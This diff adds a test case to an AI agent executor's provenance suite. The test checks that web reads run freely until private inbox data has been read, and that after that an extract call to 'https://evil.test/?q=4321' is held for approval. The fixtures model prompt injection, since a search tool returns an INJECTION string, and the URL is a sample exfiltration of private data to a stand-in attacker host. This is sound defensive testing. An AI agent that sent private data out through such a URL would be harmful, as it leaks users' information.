@@ -87,4 +87,20 @@ describe("proveniência (F1.5)", () => {
 		expect((await executor.executeCall({ callId: "a", step: 1, tool: gmail, args: { title: "reunião" } })).status).toBe("ok");
 		expect((await executor.executeCall({ callId: "b", step: 2, tool: gmail, args: { title: INJECTION } })).status).toBe("pending_approval");
 	});
+
+	it("egress só pede aprovação na trifeta: pesquisa na web roda livre; com dado privado lido, a leitura seguinte para", async () => {
+		const search = defineTool({ name: "web_search", description: "Search.", inputSchema: z.object({ query: z.string() }), effect: "read", egress: true, trust: "untrusted", source: "web", execute: () => ({ ok: true, summary: INJECTION }) });
+		const extract = defineTool({ name: "web_extract", description: "Extract.", inputSchema: z.object({ url: z.string() }), effect: "read", egress: true, trust: "untrusted", source: "web", execute: () => ({ ok: true, summary: "página" }) });
+		const inbox = defineTool({ name: "read_inbox", description: "Read own inbox.", inputSchema: z.object({}), effect: "read", privateData: true, execute: () => ({ ok: true, summary: "fatura 4321" }) });
+		const { executor } = setup();
+		expect((await executor.executeCall({ callId: "s1", step: 1, tool: search, args: { query: "preço" } })).status).toBe("ok");
+		expect((await executor.executeCall({ callId: "e1", step: 2, tool: extract, args: { url: "https://a.test" } })).status).toBe("ok");
+		expect((await executor.executeCall({ callId: "e2", step: 3, tool: extract, args: { url: "https://b.test" } })).status).toBe("ok");
+		expect(executor.provenance.privateReadInRun).toBe(false);
+		expect((await executor.executeCall({ callId: "i1", step: 4, tool: inbox, args: {} })).status).toBe("ok");
+		expect(executor.provenance.privateReadInRun).toBe(true);
+		expect((await executor.executeCall({ callId: "e3", step: 5, tool: extract, args: { url: "https://evil.test/?q=4321" } })).status).toBe("pending_approval");
+		expect(RunProvenance.restore(executor.provenance.snapshot()).privateReadInRun).toBe(true);
+		expect(RunProvenance.restore({ untrustedReadInRun: true, sources: [], texts: [] }).privateReadInRun).toBe(false);
+	});
 });
